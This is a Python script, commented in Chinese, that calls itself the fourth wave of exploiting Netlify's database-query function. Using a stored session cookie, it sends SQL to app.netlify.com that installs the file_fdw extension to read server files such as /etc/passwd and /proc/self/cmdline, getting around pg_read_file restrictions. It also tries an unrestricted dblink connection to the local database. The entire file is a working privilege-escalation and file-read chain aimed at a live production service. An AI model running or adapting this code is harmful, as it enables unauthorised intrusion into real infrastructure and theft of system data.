# -*- coding: utf-8 -*-
"""Netlify database-query 特性利用波4:file_fdw OS 文件读取链(绕过 pg_read_file 权限)
1) 装 file_fdw 2) 读 /etc/hostname 验证 3) /proc/self/cmdline 找 PGDATA 4) environ/配置文件
"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_NET

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()


def req(body, timeout=90):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_NET,
         'Content-Type': 'application/json'}
    conn.request('POST', '/.netlify/functions/database-query', body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw


def run(tag, sql, cut=900):
    try:
        s, raw = req({'siteId': SITE_ID, 'action': 'query', 'sql': sql})
        body = raw.decode('utf-8', 'ignore').replace('\n', ' ')
        print('%-26s [%d] %s' % (tag, s, body[:cut]))
    except Exception as e:
        print('%-26s ERR %s' % (tag, str(e)[:100]))


run('W1_create_file_fdw', "create extension if not exists file_fdw")
run('W2_server', "create server if not exists fs_file foreign data wrapper file_fdw")
run('W3_read_hostname', "create foreign table if not exists ft_hostname (line text) server fs_file options (filename '/etc/hostname', format 'text'); select * from ft_hostname")
run('W4_read_cmdline', "create foreign table if not exists ft_cmdline (line text) server fs_file options (filename '/proc/self/cmdline', format 'text'); select * from ft_cmdline")
run('W5_read_passwd', "create foreign table if not exists ft_passwd (line text) server fs_file options (filename '/etc/passwd', format 'text'); select * from ft_passwd limit 10")
run('W6_dblink_u_direct', "select dblink_connect_u('t','hostaddr=127.0.0.1 port=5432 dbname=netlifydb user=netlifydb_owner password=x connect_timeout=3')")
